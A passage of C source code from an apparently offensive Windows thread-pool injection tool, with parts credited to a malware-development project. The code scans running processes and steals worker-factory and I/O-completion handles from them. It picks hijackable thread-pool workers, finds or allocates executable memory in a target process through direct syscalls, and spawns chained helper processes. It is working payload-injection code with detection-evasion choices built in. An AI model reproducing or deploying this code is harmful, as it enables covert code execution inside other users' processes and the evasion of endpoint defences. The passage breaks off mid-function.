static BOOL FindTpInjectTargetProcess(IN SIZE_T cbRequiredSize)
{
    BOOL                            bResult             = FALSE;
    NTSTATUS                        ntStatus            = STATUS_SUCCESS;
    PSYSTEM_PROCESS_INFORMATION     pSystemProcInfo     = NULL;
    PSYSTEM_HANDLE_INFORMATION_EX   pHandleCache        = NULL;
    DWORD                           dwCurrentProcessId  = NtCurrentProcessId();
    PSYSTEM_PROCESS_INFORMATION     pCurrentProcInfo    = NULL;

#if REUSE_RWX_REGIONS
    // Fallback slot. First qualifying candidate with NO reusable RWX is
    // stashed here while we keep scanning for one that has RWX. If we
    // reach the end of the process list without an RWX winner, this
    // record is promoted into g_tpInjectTarget and the Writer process allocates manually.
    TP_INJECT_TARGET                Fallback            = { 0 };
    BOOL                            bFallbackSet        = FALSE;
    
    if (!cbRequiredSize) return FALSE;
#else
    (VOID)cbRequiredSize;   // Unused when RWX reuse is disabled
#endif

    // Fresh scan: wipe any leftover state in the global before populating it.
    RtlZeroMemory(&g_tpInjectTarget, sizeof(g_tpInjectTarget));

    if (!RunNtQuerySystemInformation((PVOID*)&pSystemProcInfo, SystemProcessInformation))
    {
        DBG("[!] RunNtQuerySystemInformation [SystemProcessInformation] Failed");
        goto _END_OF_FUNC;
    }

    if (!RunNtQuerySystemInformation((PVOID*)&pHandleCache, SystemExtendedHandleInformation))
    {
        DBG("[!] RunNtQuerySystemInformation [SystemExtendedHandleInformation] Failed");
        goto _END_OF_FUNC;
    }

    pCurrentProcInfo = pSystemProcInfo;

    while (TRUE)
    {
        HANDLE              hCandidateProcess       = NULL,
                            hCandidateThreadHandle  = NULL,
                            hCandidateThreadId      = NULL,
                            hStolenWorkerFactory    = NULL,
                            hStolenIoCompletion     = NULL;
        DWORD               dwCurrentPid            = (DWORD)(ULONG_PTR)pCurrentProcInfo->UniqueProcessId;
        LPCWSTR             pwszImageName           = (pCurrentProcInfo->ImageName.Buffer ? pCurrentProcInfo->ImageName.Buffer : L"<Unknown>");
        BOOL                bHasParkedWorker        = FALSE;
        OBJECT_ATTRIBUTES   ObjAttr                 = { 0 };
        CLIENT_ID           ClientId                = { 0 };
        ULONG_PTR           ullWow64PebAddress      = 0x00;
        ULONG               uReturnedLength         = 0x00;
        PVOID               pTpPoolVA               = NULL;
        DWORD               dwFactoryPid            = 0x00;
        PVOID               pFactoryStartRoutine    = NULL;

#define MAX_PARKED_TIDS_PER_PROCESS 64
        HANDLE              hParkedTids[MAX_PARKED_TIDS_PER_PROCESS]    = { 0 };
#undef MAX_PARKED_TIDS_PER_PROCESS
        ULONG               uParkedTidCount                             = 0x00;

        // Skip System Idle (0), System (4), and ourselves.
        if (dwCurrentPid <= 0x04 || dwCurrentPid == dwCurrentProcessId)
            goto _NEXT_PROCESS;

        // Collect every WrQueue-parked TID in this process. We can't tell a Win32 TPP
        // worker from a non-TPP KQUEUE waiter at snapshot time (see the comment on IsThreadTppWorker),
        // so collect all candidates and filter per-thread later. Cap is generous;
        // truncation is logged but nearly impossible in practice.
        for (ULONG uThreadIdx = 0; uThreadIdx < pCurrentProcInfo->NumberOfThreads; uThreadIdx++)
        {
            PSYSTEM_THREAD_INFORMATION pThreadInfo = &pCurrentProcInfo->ThreadInfos[uThreadIdx];

            if (pThreadInfo->ThreadState == Waiting && pThreadInfo->WaitReason == WrQueue)
            {
                if (uParkedTidCount >= ARRAYSIZE(hParkedTids))
                {
                    DBG("[!] WrQueue Thread Cap Hit In %ws (PID:%lu); Truncating At %lu", pwszImageName, dwCurrentPid, uParkedTidCount);
                    break;
                }
                hParkedTids[uParkedTidCount++] = pThreadInfo->ClientId.UniqueThread;
                bHasParkedWorker               = TRUE;
            }
        }

        if (!bHasParkedWorker) goto _NEXT_PROCESS;

        // OBJ_INHERIT on every handle we open here so they chain through
        // PS_ATTRIBUTE_HANDLE_LIST down to the Writer, and from there to the
        // Flipper, without re-duplication.
        InitializeObjectAttributes(&ObjAttr, NULL, OBJ_INHERIT, NULL, NULL);
        ClientId.UniqueProcess = pCurrentProcInfo->UniqueProcessId;
        ClientId.UniqueThread  = NULL;

        INITIALIZE_SYSCALL(g_Syscalls.ntOpenProcess);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(&hCandidateProcess,
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE,
            &ObjAttr, &ClientId);
        if (!NT_SUCCESS(ntStatus) || !hCandidateProcess)
        {
            // Access denied is the common case, so we don't log it
            if (ntStatus != STATUS_ACCESS_DENIED)
                DBG("[!] NtOpenProcess Failed For %ws (%lu) With Error: 0x%0.8X", pwszImageName, dwCurrentPid, ntStatus);
            goto _NEXT_PROCESS;
        }

        // Reject WoW64 processes; our x64 payload and the x64 TP_POOL layout both assume a native 64-bit target.
        INITIALIZE_SYSCALL(g_Syscalls.ntQueryInformationProcess);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(hCandidateProcess, (ULONG_PTR)ProcessWow64Information, &ullWow64PebAddress, (ULONG_PTR)sizeof(ULONG_PTR), &uReturnedLength);
        if (!NT_SUCCESS(ntStatus) || ullWow64PebAddress != 0x00)
            goto _CLOSE_PROC_AND_CONTINUE;

        // Steal a TpWorkerFactory handle so we can fetch the TP_POOL VA
        if (!(hStolenWorkerFactory = StealHandleOfIndexType(pHandleCache, hCandidateProcess, dwCurrentPid, (USHORT)ObTypeIndexTpWorkerFactory)))
        {
            DBG("[!] StealHandleOfIndexType Found No Duplicatable TpWorkerFactory Handle For %ws (PID:%lu)", pwszImageName, dwCurrentPid);
            goto _CLOSE_PROC_AND_CONTINUE;
        }

        if (!QueryWorkerFactoryStartParameter(hStolenWorkerFactory, &pTpPoolVA, &dwFactoryPid, &pFactoryStartRoutine) ||
            dwFactoryPid != dwCurrentPid || !pFactoryStartRoutine)
        {
            DBG("[!] QueryWorkerFactoryStartParameter Failed For %ws (PID:%lu, TP_POOL=0x%p, FactoryPid=%lu, StartRoutine=0x%p)",
                pwszImageName, dwCurrentPid, pTpPoolVA, dwFactoryPid, pFactoryStartRoutine);
            goto _CLOSE_FACTORY_AND_CONTINUE;
        }

        // Factory served its purpose; close it before walking the pool.
        INITIALIZE_SYSCALL(g_Syscalls.ntClose);
        (VOID)INVOKE_SYSCALL(hStolenWorkerFactory);
        hStolenWorkerFactory = NULL;

        // Walk the target's TP_POOL.PoolObjectList looking for a usable
        // TP_IO / TP_ALPC / TP_JOB. On success this writes the pool-object
        // fields into g_tpInjectTarget; if this candidate ends up discarded
        // or stashed as fallback, those fields are snapshotted (for the
        // fallback) or overwritten (by the next iteration).
        if (!FindPoolObjectInTargetPool(hCandidateProcess, pTpPoolVA))
            goto _CLOSE_PROC_AND_CONTINUE;

        // Need an IoCompletion handle to fire the completion packet in the Flipper.
        if (!(hStolenIoCompletion = StealHandleOfIndexType(pHandleCache, hCandidateProcess, dwCurrentPid, (USHORT)ObTypeIndexIoCompletion)))
        {
            DBG("[!] StealHandleOfIndexType Found No Duplicatable IoCompletion Handle For %ws (PID:%lu)", pwszImageName, dwCurrentPid);
            goto _CLOSE_PROC_AND_CONTINUE;
        }

        //
        // Walk every WrQueue TID we collected, opening each in turn, and
        // keep the first whose Win32StartAddress equals pFactoryStartRoutine
        // (ntdll!TppWorkerThread). This filters out .NET pollers and any
        // other non-TPP WrQueue dwellers so we only hand the APC chain to a
        // thread whose kernel wait is actually alertable (check the comment on IsThreadTppWorker).
        //
        {
            ULONG uTidIdx       = 0x00;
            PVOID pActualStart  = NULL;

            for (uTidIdx = 0; uTidIdx < uParkedTidCount; uTidIdx++)
            {
                InitializeObjectAttributes(&ObjAttr, NULL, OBJ_INHERIT, NULL, NULL);
                ClientId.UniqueProcess = NULL;
                ClientId.UniqueThread  = hParkedTids[uTidIdx];

                INITIALIZE_SYSCALL(g_Syscalls.ntOpenThread);
                ntStatus = (NTSTATUS)INVOKE_SYSCALL(&hCandidateThreadHandle, THREAD_ALL_ACCESS, &ObjAttr, &ClientId);
                if (!NT_SUCCESS(ntStatus) || !hCandidateThreadHandle)
                {
                    DBG("[!] NtOpenThread Failed For %ws (TID:%lu) With Error: 0x%0.8X",
                        pwszImageName, (DWORD)(ULONG_PTR)hParkedTids[uTidIdx], ntStatus);
                    hCandidateThreadHandle = NULL;
                    continue;
                }

                pActualStart = NULL;
                if (IsThreadTppWorker(hCandidateThreadHandle, pFactoryStartRoutine, &pActualStart))
                {
                    hCandidateThreadId = hParkedTids[uTidIdx];
                    DBG("[+] TPP Worker Confirmed: %ws (TID:%lu, Win32StartAddress=0x%p == StartRoutine)",
                        pwszImageName, (DWORD)(ULONG_PTR)hCandidateThreadId, pActualStart);
                    break;
                }

                DBG("[-] Non-TPP WrQueue Thread Rejected: %ws (TID:%lu, Win32StartAddress=0x%p != StartRoutine 0x%p)",
                    pwszImageName, (DWORD)(ULONG_PTR)hParkedTids[uTidIdx], pActualStart, pFactoryStartRoutine);

                INITIALIZE_SYSCALL(g_Syscalls.ntClose);
                (VOID)INVOKE_SYSCALL(hCandidateThreadHandle);
                hCandidateThreadHandle = NULL;
            }

            if (!hCandidateThreadHandle)
            {
                // None of the WrQueue threads is a genuine TPP worker. Drop the stolen IoCompletion and move on.
                DBG("[-] No Genuine TPP Worker Among %lu WrQueue Thread(s) In %ws (PID:%lu) - Skipping",
                    uParkedTidCount, pwszImageName, dwCurrentPid);

                INITIALIZE_SYSCALL(g_Syscalls.ntClose);
                (VOID)INVOKE_SYSCALL(hStolenIoCompletion);
                hStolenIoCompletion = NULL;

                goto _CLOSE_PROC_AND_CONTINUE;
            }
        }

        //
        // Current process candidate has passed every requirment. Now try to find a
        // reusable RWX region (>= cbRequiredSize) inside it. First hit wins & nothing further is scanned.
        //
#if REUSE_RWX_REGIONS

        {
            PVOID   pRwxBase    = NULL;
            SIZE_T  cbRwxSize   = 0x00;
            BOOL    bFoundRwx   = FindRwxRegionInTarget(hCandidateProcess, cbRequiredSize, &pRwxBase, &cbRwxSize);

            if (bFoundRwx)
            {
                // RWX winner. If we had a fallback stashed, drop it.
                // The current candidate is strictly better (no allocate + no protection flip).
                if (bFallbackSet)
                {
                    DBG("[i] Discarding Fallback (PID:%lu) In Favor Of RWX-Reuse Candidate (PID:%lu)",
                        Fallback.dwProcessId, dwCurrentPid);

                    if (Fallback.hProcess)       { INITIALIZE_SYSCALL(g_Syscalls.ntClose); (VOID)INVOKE_SYSCALL(Fallback.hProcess);       }
                    if (Fallback.hThread)        { INITIALIZE_SYSCALL(g_Syscalls.ntClose); (VOID)INVOKE_SYSCALL(Fallback.hThread);        }
                    if (Fallback.hIoCompletion)  { INITIALIZE_SYSCALL(g_Syscalls.ntClose); (VOID)INVOKE_SYSCALL(Fallback.hIoCompletion);  }
                    RtlZeroMemory(&Fallback, sizeof(Fallback));
                    bFallbackSet = FALSE;
                }

                // Fill in the fields FindPoolObjectInTargetPool didn't populate.
                g_tpInjectTarget.dwProcessId     = dwCurrentPid;
                g_tpInjectTarget.dwThreadId      = (DWORD)(ULONG_PTR)hCandidateThreadId;
                g_tpInjectTarget.hProcess        = hCandidateProcess;
                g_tpInjectTarget.hThread         = hCandidateThreadHandle;
                g_tpInjectTarget.hIoCompletion   = hStolenIoCompletion;
                g_tpInjectTarget.bReusedRwx      = TRUE;
                g_tpInjectTarget.pReusedRwxBase  = pRwxBase;
                g_tpInjectTarget.cbReusedRwxSize = cbRwxSize;

                if (pCurrentProcInfo->ImageName.Buffer)
                    lstrcpyW(g_tpInjectTarget.wszProcessName, pCurrentProcInfo->ImageName.Buffer);

                DBG("[+] Target Accepted [RWX-REUSE]: %ws (PID:%lu, TID:%lu, Kind=%s)",
                    pwszImageName, dwCurrentPid, (DWORD)(ULONG_PTR)hCandidateThreadId,
                    (g_tpInjectTarget.TpObjectFound == TpObjectKindIo)   ? "TP_IO"   :
                    (g_tpInjectTarget.TpObjectFound == TpObjectKindAlpc) ? "TP_ALPC" : "TP_JOB");
                DBG("[+]   hProcess=0x%p hThread=0x%p hIoCompletion=0x%p",
                    g_tpInjectTarget.hProcess, g_tpInjectTarget.hThread, g_tpInjectTarget.hIoCompletion);
                DBG("[+]   OuterBase=0x%p &TP_DIRECT=0x%p &TP_DIRECT.Callback=0x%p OriginalCallback=0x%p",
                    g_tpInjectTarget.pOuterBase, g_tpInjectTarget.pTpDirectVA,
                    g_tpInjectTarget.pTpDirectCallbackVA, g_tpInjectTarget.pOriginalCallback);
                DBG("[+]   Reused RWX Region: Base=0x%p Size=%lu", pRwxBase, (ULONG)cbRwxSize);

                bResult = TRUE;
                goto _END_OF_FUNC;
            }

            //
            // No reusable RWX in this candidate. If we don't already have a fallback
            // stashed, snapshot this one (handles stay open) and keep scanning.
            // Otherwise discard this candidate's handles and continue.
            //
            if (!bFallbackSet)
            {
                // Copy pool-object fields out of the global before the next iteration overwrites them.
                Fallback                 = g_tpInjectTarget;
                Fallback.dwProcessId     = dwCurrentPid;
                Fallback.dwThreadId      = (DWORD)(ULONG_PTR)hCandidateThreadId;
                Fallback.hProcess        = hCandidateProcess;
                Fallback.hThread         = hCandidateThreadHandle;
                Fallback.hIoCompletion   = hStolenIoCompletion;
                Fallback.bReusedRwx      = FALSE;
                Fallback.pReusedRwxBase  = NULL;
                Fallback.cbReusedRwxSize = 0x00;

                if (pCurrentProcInfo->ImageName.Buffer)
                    lstrcpyW(Fallback.wszProcessName, pCurrentProcInfo->ImageName.Buffer);

                bFallbackSet = TRUE;

                DBG("[i] Fallback Candidate Stashed (will allocate if nothing better turns up): %ws (PID:%lu, TID:%lu, Kind=%s)",
                    pwszImageName, dwCurrentPid, (DWORD)(ULONG_PTR)hCandidateThreadId,
                    (Fallback.TpObjectFound == TpObjectKindIo)   ? "TP_IO"   :
                    (Fallback.TpObjectFound == TpObjectKindAlpc) ? "TP_ALPC" : "TP_JOB");

                // Keep handles open for the fallback; skip the cleanup labels
                // and go straight to the next process.
                goto _NEXT_PROCESS;
            }
            else
            {
                DBG("[i] Already Have Fallback (PID:%lu). Discarding Non-RWX Candidate (PID:%lu)",
                    Fallback.dwProcessId, dwCurrentPid);

                if (hCandidateThreadHandle)
                {
                    INITIALIZE_SYSCALL(g_Syscalls.ntClose);
                    (VOID)INVOKE_SYSCALL(hCandidateThreadHandle);
                    hCandidateThreadHandle = NULL;
                }
                if (hStolenIoCompletion)
                {
                    INITIALIZE_SYSCALL(g_Syscalls.ntClose);
                    (VOID)INVOKE_SYSCALL(hStolenIoCompletion);
                    hStolenIoCompletion = NULL;
                }
                goto _CLOSE_PROC_AND_CONTINUE;
            }
        }
#else   // REUSE_RWX_REGIONS == FALSE

        //
        // RWX reuse compiled out. First candidate that passes all structural
        // gates wins immediately. Writer will take the classic allocate-and-flip
        // path (bReusedRwx stays FALSE).
        //
        g_tpInjectTarget.dwProcessId     = dwCurrentPid;
        g_tpInjectTarget.dwThreadId      = (DWORD)(ULONG_PTR)hCandidateThreadId;
        g_tpInjectTarget.hProcess        = hCandidateProcess;
        g_tpInjectTarget.hThread         = hCandidateThreadHandle;
        g_tpInjectTarget.hIoCompletion   = hStolenIoCompletion;
        g_tpInjectTarget.bReusedRwx      = FALSE;
        g_tpInjectTarget.pReusedRwxBase  = NULL;
        g_tpInjectTarget.cbReusedRwxSize = 0x00;

        if (pCurrentProcInfo->ImageName.Buffer)
            lstrcpyW(g_tpInjectTarget.wszProcessName, pCurrentProcInfo->ImageName.Buffer);

        DBG("[+] Target Accepted [RWX-REUSE DISABLED]: %ws (PID:%lu, TID:%lu, Kind=%s)",
            pwszImageName, dwCurrentPid, (DWORD)(ULONG_PTR)hCandidateThreadId,
            (g_tpInjectTarget.TpObjectFound == TpObjectKindIo)   ? "TP_IO"   :
            (g_tpInjectTarget.TpObjectFound == TpObjectKindAlpc) ? "TP_ALPC" : "TP_JOB");
        DBG("[+]   hProcess=0x%p hThread=0x%p hIoCompletion=0x%p",
            g_tpInjectTarget.hProcess, g_tpInjectTarget.hThread, g_tpInjectTarget.hIoCompletion);
        DBG("[+]   OuterBase=0x%p &TP_DIRECT=0x%p &TP_DIRECT.Callback=0x%p OriginalCallback=0x%p",
            g_tpInjectTarget.pOuterBase, g_tpInjectTarget.pTpDirectVA,
            g_tpInjectTarget.pTpDirectCallbackVA, g_tpInjectTarget.pOriginalCallback);

        bResult = TRUE;
        goto _END_OF_FUNC;

#endif // REUSE_RWX_REGIONS

_CLOSE_FACTORY_AND_CONTINUE:
        if (hStolenWorkerFactory)
        {
            INITIALIZE_SYSCALL(g_Syscalls.ntClose);
            (VOID)INVOKE_SYSCALL(hStolenWorkerFactory);
            hStolenWorkerFactory = NULL;
        }
_CLOSE_PROC_AND_CONTINUE:
        if (hCandidateProcess)
        {
            INITIALIZE_SYSCALL(g_Syscalls.ntClose);
            (VOID)INVOKE_SYSCALL(hCandidateProcess);
        }
_NEXT_PROCESS:
        if (pCurrentProcInfo->NextEntryOffset == 0x00)
            break;
        pCurrentProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pCurrentProcInfo + pCurrentProcInfo->NextEntryOffset);
    }

#if REUSE_RWX_REGIONS
    // Scanned every process without an RWX-reuse winner. Promote the first
    // stashed fallback (if any) into g_tpInjectTarget and let the Writer process allocate.
    if (!bResult && bFallbackSet)
    {
        DBG("[-] No RWX-Reuse Candidate Found Anywhere. Promoting Fallback: %ws (PID:%lu, TID:%lu, Kind=%s) - Writer Will Allocate",
            Fallback.wszProcessName, Fallback.dwProcessId, Fallback.dwThreadId,
            (Fallback.TpObjectFound == TpObjectKindIo)   ? "TP_IO"   :
            (Fallback.TpObjectFound == TpObjectKindAlpc) ? "TP_ALPC" : "TP_JOB");

        g_tpInjectTarget = Fallback;
        // Clear the local so the _END_OF_FUNC cleanup doesn't double-close handles that now live in the global.
        RtlZeroMemory(&Fallback, sizeof(Fallback));
        bFallbackSet     = FALSE;
        bResult          = TRUE;
    }
#endif

    if (!bResult)
        DBG("[!] FindTpInjectTargetProcess: Scanned Every Process, No Candidate Met Criteria");

_END_OF_FUNC:
#if REUSE_RWX_REGIONS
    // If a fallback is still stashed (either because the RWX winner path was
    // taken, or because of an early error exit), its handles need closing.
    if (bFallbackSet)
    {
        if (Fallback.hProcess)      { INITIALIZE_SYSCALL(g_Syscalls.ntClose); (VOID)INVOKE_SYSCALL(Fallback.hProcess);      }
        if (Fallback.hThread)       { INITIALIZE_SYSCALL(g_Syscalls.ntClose); (VOID)INVOKE_SYSCALL(Fallback.hThread);       }
        if (Fallback.hIoCompletion) { INITIALIZE_SYSCALL(g_Syscalls.ntClose); (VOID)INVOKE_SYSCALL(Fallback.hIoCompletion); }
    }
#endif

    if (pSystemProcInfo) HeapFree(GetProcessHeap(), 0x00, pSystemProcInfo);
    if (pHandleCache)    HeapFree(GetProcessHeap(), 0x00, pHandleCache);
    return bResult;
}

#pragma endregion   // Target Discovery

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// The following functions are from
// https://github.com/Maldev-Academy/WhisperHijack

#pragma region Granularity-Based Allocation

//
// Walk a fixed list of candidate base addresses and return the first one whose
// span of granularity-sized chunks is entirely MEM_FREE in the target.
//
static PVOID FindSuitableAddress(IN HANDLE hProcess, IN ULONG uLength, IN ULONG uGranularity, OUT PULONG puGranularityCount OPTIONAL)
{
    MEMORY_BASIC_INFORMATION    MbiRegion           = { 0 };
    ULONG_PTR                   uAddress            = 0x00;
    ULONG                       uGranularityCount   = 0x00;
    ULONG                       uFreeCount          = 0x00;
    NTSTATUS                    ntStatus            = STATUS_SUCCESS;
    SIZE_T                      sReturnLength       = 0x00;
    ULONG_PTR                   puCandidates[]      = {
        0x00000000DDDD0000,
        0x0000000010000000,
        0x0000000021000000,
        0x0000000032000000,
        0x0000000043000000,
        0x0000000050000000,
        0x0000000041000000,
        0x0000000042000000,
        0x0000000040000000,
        0x0000000022000000,
        0x0000000054000000,
        0x0000000065000000,
        0x0000000076000000,
        0x0000000060000000,
        0x0000000070000000,
        0x0000000000020000,
        0x0000000000100000,
        0x0000000001000000,
        0x00000000CCCC0000
    };

    // Calculate how many granularity-sized chunks are needed to cover uLength
    uGranularityCount = (uLength / uGranularity) + 1;

    if (puGranularityCount) *puGranularityCount = uGranularityCount;

    DBG("[i] Searching For %lu Bytes (%lu Chunks Of 0x%lX) In Handle 0x%p", uLength, uGranularityCount, uGranularity, hProcess);

    for (ULONG ulIdx = 0; ulIdx < ARRAYSIZE(puCandidates); ulIdx++)
    {
        uFreeCount = 0;

        // Walk each granularity-sized chunk forward from the candidate base
        for (ULONG uChunk = 0; uChunk < uGranularityCount; uChunk++)
        {
            // Derive the address for this chunk cleanly from the base each iteration
            uAddress = puCandidates[ulIdx] + ((ULONG_PTR)uChunk * uGranularity);

            RtlZeroMemory(&MbiRegion, sizeof(MbiRegion));

            // Run NtQueryVirtualMemory(MemoryBasicInformation)
            INITIALIZE_SYSCALL(g_Syscalls.ntQueryVirtualMemory);
            ntStatus = (NTSTATUS)INVOKE_SYSCALL(hProcess, (PVOID)uAddress, MemoryBasicInformation, &MbiRegion, sizeof(MbiRegion), &sReturnLength);

            // Any failure (invalid address past user-mode, unmapped, etc.) disqualifies the candidate
            if (!NT_SUCCESS(ntStatus))
                break;

            // Candidate is unsuitable if any chunk in range is not free
            if (MbiRegion.State != MEM_FREE)
                break;

            uFreeCount++;
        }

        // All chunks were free.
        if (uFreeCount == uGranularityCount)
        {
            DBG("[+] Found Suitable Address: 0x%p (%lu Chunks Free)", (PVOID)puCandidates[ulIdx], uFreeCount);
            return (PVOID)puCandidates[ulIdx];
        }
    }

    DBG("[-] No Suitable Address Found Across %lu Candidates", (ULONG)ARRAYSIZE(puCandidates));
    return NULL;
}

//
// Reserve each granularity-sized region at the base returned by FindSuitableAddress
// as PAGE_NOACCESS, then commit each page inside it individually with the requested
// protection. Granularity-based allocation keeps the payload region at a predictable
// address and lets us shape the commit pattern per page.
//
static PVOID AllocateVirtualMemory(IN HANDLE hProcess, IN ULONG uLength, IN ULONG uProtection)
{
    PVOID           pBaseAddress        = NULL;
    PVOID           pTmpAddress         = NULL;
    SIZE_T          sTmpSize            = 0x00;
    ULONG_PTR       uGranularityAlloc   = 0x00,
                    uPageAddress        = 0x00;
    ULONG           uGranularitySize    = 0x00,
                    uGranularityCount   = 0x00,
                    uPageSize           = 0x00;
    SYSTEM_INFO     SystemInfo          = { 0 };
    NTSTATUS        ntStatus            = STATUS_SUCCESS;

    if (!hProcess || !uLength || !uProtection)
        return NULL;

    GetSystemInfo(&SystemInfo);

    uGranularitySize    = SystemInfo.dwAllocationGranularity;
    uPageSize           = SystemInfo.dwPageSize;

    // Find a suitable base address, receiving the granularity count to avoid recomputing it
    if (!(pBaseAddress = FindSuitableAddress(hProcess, uLength, uGranularitySize, &uGranularityCount)))
        return NULL;

    uGranularityAlloc = (ULONG_PTR)pBaseAddress;

    // Reserve each granularity-sized region, then commit its individual pages
    for (ULONG ulIdx = 0; ulIdx < uGranularityCount; ulIdx++)
    {
        // Reserve the granularity-sized region as PAGE_NOACCESS
        pTmpAddress = (PVOID)uGranularityAlloc;
        sTmpSize    = (SIZE_T)uGranularitySize;

        // Run NtAllocateVirtualMemory
        INITIALIZE_SYSCALL(g_Syscalls.ntAllocateVirtualMemory);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(hProcess, &pTmpAddress, 0, &sTmpSize, MEM_RESERVE, PAGE_NOACCESS);
        if (!NT_SUCCESS(ntStatus))
        {
            DBG("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X", ntStatus);
            return NULL;
        }

        DBG("[+] Reserved Granularity Region %lu/%lu: 0x%p", ulIdx + 1, uGranularityCount, (PVOID)uGranularityAlloc);

        // Commit each page within the reserved region with the requested protection
        for (ULONG uPage = 0; uPage < (uGranularitySize / uPageSize); uPage++)
        {
            uPageAddress = uGranularityAlloc + ((ULONG_PTR)uPage * uPageSize);
            pTmpAddress  = (PVOID)uPageAddress;
            sTmpSize     = (SIZE_T)uPageSize;

            // Run NtAllocateVirtualMemory
            INITIALIZE_SYSCALL(g_Syscalls.ntAllocateVirtualMemory);
            ntStatus = (NTSTATUS)INVOKE_SYSCALL(hProcess, &pTmpAddress, 0, &sTmpSize, MEM_COMMIT, uProtection);
            if (!NT_SUCCESS(ntStatus))
            {
                DBG("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X", ntStatus);
                return NULL;
            }
        }

        uGranularityAlloc += uGranularitySize;
    }

    DBG("[+] Allocated %lu Bytes @ 0x%p (%lu Regions Committed)", uLength, pBaseAddress, uGranularityCount);
    return pBaseAddress;
}

#pragma endregion   // Granularity-Based Allocation

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// The following function is from
// https://github.com/Maldev-Academy/WhisperHijack

#pragma region Process Creation

//
// Spawn a child via NtCreateUserProcess with an optional MITIGATION_POLICY_HARDENED
// mitigation attribute and an optional PS_ATTRIBUTE_HANDLE_LIST for cross-process
// handle inheritance. Both the Grandparent to Writer and Writer to Flipper hops go through this function.
//
static BOOL SpawnChildProcess(IN LPCWSTR pwszImagePath, IN LPCWSTR pwszCommandLine, IN BOOL bHardenChild, IN OPTIONAL PHANDLE pInheritHandles, IN ULONG uInheritHandleCount)
{
    NTSTATUS                            ntStatus                = STATUS_SUCCESS;
    PRTL_USER_PROCESS_PARAMETERS        pProcParams             = NULL;
    PPS_ATTRIBUTE_LIST                  pAttrList               = NULL;
    SIZE_T                              sAttrListSize           = 0x00;
    ULONG                               uAttrCount              = 0x00,
                                        uAttrIndex              = 0x00;
    UINT64                              u64MitigationPolicy     = MITIGATION_POLICY_HARDENED;
    UNICODE_STRING                      usImagePath             = { 0 };
    UNICODE_STRING                      usCommandLine           = { 0 };
    UNICODE_STRING                      usCurrentDir            = { 0 };
    PS_CREATE_INFO                      psCreateInfo            = { 0 };
    HANDLE                              hChildProcess           = NULL;
    HANDLE                              hChildThread            = NULL;
    BOOL                                bResult                 = FALSE;

    if (!pwszImagePath || !pwszCommandLine)
        return FALSE;

    // Build UNICODE_STRINGs for the three required path strings 
    g_WinAPIs.pRtlInitUnicodeString(&usImagePath,   pwszImagePath);
    g_WinAPIs.pRtlInitUnicodeString(&usCommandLine, pwszCommandLine);
    g_WinAPIs.pRtlInitUnicodeString(&usCurrentDir,  L"C:\\Windows\\System32\\");

    // Build RTL_USER_PROCESS_PARAMETERS  
    ntStatus = g_WinAPIs.pRtlCreateProcessParametersEx(
        &pProcParams,
        &usImagePath,
        NULL,                                   // DllPath           (Default)
        &usCurrentDir,                          // CurrentDirectory   
        &usCommandLine,                         // CommandLine       
        NULL,                                   // Environment       (Inherit)
        NULL,                                   // WindowTitle
        NULL,                                   // DesktopInfo
        NULL,                                   // ShellInfo
        NULL,                                   // RuntimeData
        RTL_USER_PROC_PARAMS_NORMALIZED
    );

    if (!NT_SUCCESS(ntStatus))
    {
        DBG("[!] RtlCreateProcessParametersEx Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }

    // Build PS_ATTRIBUTE_LIST(s) 
    //
    // Required: PsAttributeImageName
    // Optional: PsAttributeMitigationOptions  (if bHardenChild)
    // Optional: PsAttributeHandleList         (if uInheritHandleCount > 0)
    //
    uAttrCount      = 1 + (bHardenChild ? 1 : 0) + (uInheritHandleCount > 0 ? 1 : 0);
    sAttrListSize   = sizeof(SIZE_T) + (uAttrCount * sizeof(PS_ATTRIBUTE));

    if (!(pAttrList = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sAttrListSize)))
    {
        DBG("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    pAttrList->TotalLength                      = sAttrListSize;

    // Attribute: Image name (always present)
    pAttrList->Attributes[uAttrIndex].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    pAttrList->Attributes[uAttrIndex].Size      = usImagePath.Length;
    pAttrList->Attributes[uAttrIndex].ValuePtr  = usImagePath.Buffer;
    uAttrIndex++;

    // Attribute: Mitigation policy (only when hardening was requested)
    if (bHardenChild)
    {
        pAttrList->Attributes[uAttrIndex].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS;
        pAttrList->Attributes[uAttrIndex].Size      = sizeof(u64MitigationPolicy);
        pAttrList->Attributes[uAttrIndex].ValuePtr  = &u64MitigationPolicy;
        uAttrIndex++;
    }

    // Attribute: Inherit handle list (only when handles were supplied)
    if (uInheritHandleCount > 0)
    {
        pAttrList->Attributes[uAttrIndex].Attribute = PS_ATTRIBUTE_HANDLE_LIST;
        pAttrList->Attributes[uAttrIndex].Size      = uInheritHandleCount * sizeof(HANDLE);
        pAttrList->Attributes[uAttrIndex].ValuePtr  = pInheritHandles;
        uAttrIndex++;
    }

    // Build PS_CREATE_INFO 
    psCreateInfo.Size   = sizeof(PS_CREATE_INFO);
    psCreateInfo.State  = PsCreateInitialState;

    // Run NtCreateUserProcess 
    INITIALIZE_SYSCALL(g_Syscalls.ntCreateUserProcess);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(
